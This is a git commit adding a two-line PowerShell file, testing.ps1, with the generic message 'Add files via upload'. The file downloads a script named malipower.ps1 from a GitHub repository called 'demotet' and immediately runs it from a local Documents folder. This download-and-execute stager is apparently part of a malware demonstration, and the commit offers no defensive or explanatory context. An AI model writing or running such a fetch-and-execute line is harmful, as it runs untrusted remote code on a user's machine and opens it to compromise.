b5c53bea71fe9ecf16b0d67de63cf23cdfe58c9e
tokio-oyama <103776742+tokio-oyama@users.noreply.github.com>
2022-04-15 14:57:16 -0400

    Add files via upload

---
+++ testing.ps1
@@ -0,0 +1,2 @@
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/tokio-oyama/demotet/main/malipower.ps1 -OutFile C:\Users\t-oyama\Documents\test\malipower.ps1; 
+C:\Users\t-oyama\Documents\test\malipower.ps1 
